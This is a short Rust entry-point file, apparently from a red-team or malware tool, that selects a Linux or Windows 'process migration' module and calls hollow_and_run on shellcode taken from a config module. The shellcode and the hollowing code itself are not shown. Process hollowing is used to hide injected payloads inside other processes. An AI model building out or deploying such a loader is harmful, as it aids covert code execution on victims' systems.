// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(target_os = "linux")]
mod rco_process_migration_linux;
#[cfg(target_os = "linux")]
use rco_process_migration_linux::hollow_and_run;

#[cfg(windows)]
mod rco_process_migration_windows;
#[cfg(windows)]
use rco_process_migration_windows::hollow_and_run;

fn main() {
    hollow_and_run(config::SHELLCODE);
}